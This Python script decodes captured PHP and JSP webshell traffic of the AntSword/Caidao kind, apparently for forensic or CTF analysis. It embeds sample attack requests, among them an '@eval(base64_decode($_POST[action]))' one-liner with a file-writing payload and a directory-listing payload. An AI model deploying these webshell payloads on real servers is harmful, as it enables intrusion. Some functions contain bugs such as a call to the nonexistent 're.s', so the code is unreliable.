import base64 
import libnum 
import re 
import binascii
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from urllib.parse import unquote



def RSA公钥分解(pem):
    with open(pem , 'rb') as f:
        公钥 = f.read()
    rsa_key = RSA.import_key(公钥)  # 导入公钥
    return rsa_key.n, rsa_key.e # 返回模数和指数


class PHP():

    def PHP(请求字符串):
        请求字符串 = unquote(请求字符串)
        
        if len(re.findall(r'echo "([a-f0-9]+)"',请求字符串,re.I)) == 2:
            header ,footer = re.findall(r'echo "([a-f0-9]+)"',请求字符串,re.I)
        else:
            header = footer = "未找到加密标记"

        if re.findall(r'\$_POST\["([a-f0-9]+)"\]', 请求字符串,re.I):
            comm = re.findall(r'\$_POST\["([a-f0-9]+)"\]', 请求字符串,re.I)[0]
        else:
            comm = "未找到命令语句"

        return [header,footer,comm,请求字符串]




    def PHP_base64_req(请求字符串):
        解码字符串 = unquote(请求字符串)
        列表 = 解码字符串.rsplit('&')
        for i in 列表:
            if 'action=' in i:
                webshell_str =  re.findall(r'action=(.*)',i)[0]
                webshell_str = base64.b64decode(webshell_str).decode("utf-8", errors="ignore")
            if 'z1=' in i:
                z1 = re.findall(r'z1=(.*)', i)[0]
                z1 = base64.b64decode(z1).decode("utf-8", errors="ignore")
            if 'z2=' in i:
                z2 = re.findall(r'z2=(.*)', i)[0]
                try:
                    z2 = binascii.unhexlify(z2).decode()
                except Exception:
                    z2 = base64.b64decode(z2).decode("utf-8", errors="ignore")
            else:
                z2 = ''
        return webshell_str , z1 , z2
    
    def PHP_base64_res(响应字符串):
        
        响应列表 = re.s (r'->|(.+)|<-' ,响应字符串 , re.I )
        return 响应列表




    def PHP_RSA_req(请求字符串 , pem):
        n , e =RSA公钥分解(pem)  # 分解公钥为模数和指数

        请求列表 = 请求字符串.split('|')   # 处理请求字符串，将每个请求分割成单独的命令
        请求命令 = []
        for i in 请求列表:
            i1=base64.b64decode(i)
            m1=libnum.s2n(i1)
            m1=pow(m1,e,n)
            m2=libnum.n2s(m1)
            请求命令.append(m2.decode("utf-8","ignore"))

        请求命令 = ''.join(请求命令)
        请求命令 = ''.join(x for x in 请求命令 if x.isprintable())  # 移除不可见字符

        return 请求命令

    def PHP_RSA_res(请求命令,响应字符串,key):
        头   = re.findall(r'echo "([0-9a-z]+)"' ,请求命令 , re.I )[0] 
        尾   = re.findall(r'echo "([0-9a-z]+)"' ,请求命令 , re.I )[-1]
        响应字符串=响应字符串.replace(头, '').replace(尾, '') # 处理响应
        #print(响应字符串)
        响应内容 = base64.b64decode(响应字符串)
        #print(响应内容)
        aes = AES.new(key,AES.MODE_ECB) #创建一个aes对象
        # AES.MODE_ECB 表示模式是ECB模式
        响应内容 = aes.decrypt(响应内容) # 解密密文
        try :
            while True:
                响应内容 = base64.b64decode(响应内容).decode()
        except Exception : 
            pass

        return 响应内容


class JSP():
    def JSP_req(请求字符串):
        try:
            解码字符串 = binascii.unhexlify(请求字符串).decode() 
        except Exception:
            try:
                解码字符串 = base64.b64decode(请求字符串)
            except Exception:
                print('解码错误')
        return 解码字符串

    def JSP_AES_128_req(请求字符串,key):  # aes解密，密钥为16位
        try:
            ase128 = AES.new(key,AES.MODE_CFB)
            解码字符串 = ase128.decrypt(请求字符串)
        except Exception: 
            try:
                ase256 = AES.new(key,AES.MODE_ECB)
                解码字符串 = ase256.decrypt(请求字符串)
            except Exception: 
                print('解码错误')
        return 解码字符串
    
    def JSP_res(响应字符串):  
        try:
            解码字符串 = binascii.unhexlify(响应字符串).decode() 
        except Exception: 
            pass
        try:
            解码字符串 = base64.b64decode(响应字符串)
        except Exception:
            print('解码错误')
        return 解码字符串






if __name__ == "__main__":

    # PHP
    # 请求字符串 ='aaa=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%22feabf8f5a3%22%3Becho%20%40asenc(%24output)%3Becho%20%22402a78405ac%22%3B%7Dob_start()%3Btry%7B%24D%3Dbase64_decode(substr(%24_POST%5B%22bd6d05dc659984%22%5D%2C2))%3B%24F%3D%40opendir(%24D)%3Bif(%24F%3D%3DNULL)%7Becho(%22ERROR%3A%2F%2F%20Path%20Not%20Found%20Or%20No%20Permission!%22)%3B%7Delse%7B%24M%3DNULL%3B%24L%3DNULL%3Bwhile(%24N%3D%40readdir(%24F))%7B%24P%3D%24D.%24N%3B%24T%3D%40date(%22Y-m-d%20H%3Ai%3As%22%2C%40filemtime(%24P))%3B%40%24E%3Dsubstr(base_convert(%40fileperms(%24P)%2C10%2C8)%2C-4)%3B%24R%3D%22%09%22.%24T.%22%09%22.%40filesize(%24P).%22%09%22.%24E.%22%0A%22%3Bif(%40is_dir(%24P))%24M.%3D%24N.%22%2F%22.%24R%3Belse%20%24L.%3D%24N.%24R%3B%7Decho%20%24M.%24L%3B%40closedir(%24F)%3B%7D%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B'
    # 响应字符串 =''
    # 请求命令 = PHP.PHP(请求字符串)
    # for i in 请求命令:
    #     print(f'命令: {i}')


    # php_base64
    请求字符串 = 'tom=@eval·(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L3Zhci93d3cvdXBsb2FkL2ltYWdlcy9qaWFveWkudHh0&z2=ZW1tbW1tbW1tLG9rLmhvdyB0byBnaXZlIHlvdSBtb25leS4%3D'

    响应字符串 = '->|1|<-'

    webshell_str , z1 , z2 = PHP.PHP_base64_req(请求字符串)
    print(webshell_str)
    print(z1)
    print(z2)

    #响应列表 = PHP.PHP_base64_res(响应字符串)
    #for i in 响应列表:
    #    print(i)




    # PHP_RSA
    #pem = "C:/Users/wadd/Desktop/公钥.pem"
    #请求字符串 = 'BTGSM8GnyYMyhWUZbk8URh+5LlbDF5BJLF+XnAAAl+C9UmZWQXlM6NZrop8EaVIqtREDq2AXijBfKObw6CdXbnrqvxnPA0x3V/h/WOieCNjfiUzNgo2Uzar6rsvlnQmFqDRakh/VZx1EbSIbVr9306Db35WtUQ/m4gIHMDt17Gw=|A6LGjeyvCNVwbWsAxDgTH5v7drLEPdD5/PUpqGwDOq+N+P1ivPL3N/Rm29tvf9XtweWcFFTZaHAorET0fb7usWqEpKdho4dZuRwrymPkaHEJ9x9mJYS146YZuvVlhn+Hdiwk1jhsQw2yQhUki5xfIYVCJKma7u7pNlsgSl7a0ys=|C/EfnM80hLqAMbSCeb8sCIVWrQhEeU8VL5c76OeFTMdiwIKlQ6w1c0TAZrqoRk5VhfFj53ilcmNeZZw0EZENrrZl8Iwr5E9oaalHtAF6NTRT5RocnSHqSgObCWz97I1J8pCGBaiIusDWx1PlUMb/Z0/KzbTSzfCdHj0mXPpBRm0=|gdloKWWMdzUyMlZLIvYGS/ePAd+8Aqqbg8y9fNf22Amt+BfzgPgmlGhJsmjRL1HN+pQ4OHNK1AOIVTmOA/FSqrnMt0FDfweX31peoocxZySu3+Yo9+FyO8idKW0nV//wfvU3UigA+MXXHd2KaDJSr/H3CFxPD5R8sBzu1BxPLBo=|JaV9bxKoXxvaapoLnhNWyQxsmPS2lH/Iz/QNOkJL6zNq+vfuzyA0lZykObOIjoeZy7Hs4E4ZV52rqdz2Kj8u5nEkUeKyB5/TcU+YGlPHzdxCxdF/LeIR5Bdk+OZyXg9lNe41AhC7nB+ILJG5rFXYmHP4MRCL2fQtJxOTLPK+KsI=|e644juHsnSn5Ee3vJytQy0g+DrEUivyhzcUka3FyapNrK+x2rw+wBjilACp7UAgXyqV87ecriIAHiOZRwFVF/PJzPQxVdYjf1UYTD85tA1hW2QXUjJ40PbDVHj7KNcz5mcXfhxf2oKVxEs8VSaV5s/oLY947i/ob9cK5OD7BRLI=|fzghKQChfhqtiF4LNyKTTt0knEpvyvLwmARGrz9/9Nzq8zooK5OL+FfWl8caiXutzEtno/y7R+WZYPIBC4C1Xw1pH2Ddmg9yH0UNeoNFnLQ2NHw/R3FqnyCjHGSa8QWBd9GW6DkvzX2dyASr/VRaO02jmXpIiBj3qH+Jybd1K/g=|FOJF7u+TBO87Qx3M00QcmXfkemu7EyUJIpxseE1/93VFbzewXknHboDDqmh5eLlrqdedw/C2oAuSKNG6nRdgqXO6y6eKAAgohWQrkUO2PHcAd5DE+DwHQvrzAHemHSygbJGp3MkXxt2acD6bRlMpLsurST/f8n8t0j1P9u4YXfA=|Bl9SXQgvZX4/2I/hztQN8fcsMvTSOgrfAmms3+2y2bnMeblIxy1k2Nbie5/A9GFrM5HgxpkoAXEa9nr1rWhVxeGr1z4kP7F7E82dDzXkkTfZYt/2DLSRoOqXVzKVomprIEZYbCeD11dT/i9wKZNDewmP4xAXkRtzgh54exH9IiI=|FujB2nTxNy/rJ8J2iA1mKovFuxFmqP5qUxuq6NQvxReD/AtcW6lNO1mzxPwI/cjPRtxG1qWnMl84DcAAOHjkiPeMHXzGDZkGDmWSChF21IAN0jYU6TPV6Ftg9TJ68x10eVBccAlJnkjyo3189xVkhglgS9cyVQxb9VlxN4oR5lI=|MLxeOXoAXDx5ks22DCxawTxLTAgGkPzL3dFZLM9tGanSTG3MXplU0gBPmiOGIhfHDWKG/a1o2aGSPhkuNGqs3Gpg986MTpPH3l/d8onRFnvKVVGOanir4TZYoYvdPXfXMv60NZrsgrZBvyabS/LixfR9CSxUlyv9ztJxbp56Mmk='
    #响应字符串 = 'f9d3fc090d9fu6ScLHPsubeKhToypBM8ohaf8DWOrghcmyC0iVjhdWW2ALZT/doKdD8aICrvCujX/5pKmFdrqup1z8wJhdC21sMIR/y/wyU09bvPizyijB8iK8XAqWms8QhhDSudoemq/aNCvOAR69tSRGNvDzP3XLGUih9F0Ya61pBd80LZRV0Zde/4dRea3ch7jtQRNkwTJOhtGGVhzKHpl4JgYvyW0EpiIkPPLZJbDxDJZ83k=4d608782174'
    #请求命令 = PHP.PHP_RSA_req(请求字符串 , pem)
    #print(f'请求命令: {请求命令}')
    #key = b'hm3pq66843bbbrdg'
    #响应内容 = PHP.PHP_RSA_res(请求命令,响应字符串, key)
    #print(f'响应内容: {响应内容}')

 

    # JSP
    #请求字符串 = '2f7573722f6c6f63616c2f746f6d6361742f776562617070732f6d61696e2f'
    #请求内容 = JSP.JSP_req(请求字符串)
    #print(f'内容: {请求内容}')
    #响应字符串 = '545556555153314a546b5976435449774d546b744d446b744d4463674d5455364d4459364e54494a4e4441354e676c534946634b62574670626935716333414a4d6a41784f5330774f533077a4e7941784f446f774d546f784e676b794d546b304d676c534946634'
    #响应内容 =  JSP.JSP_res(响应字符串)
    #print(f'内容: {响应内容}')


 

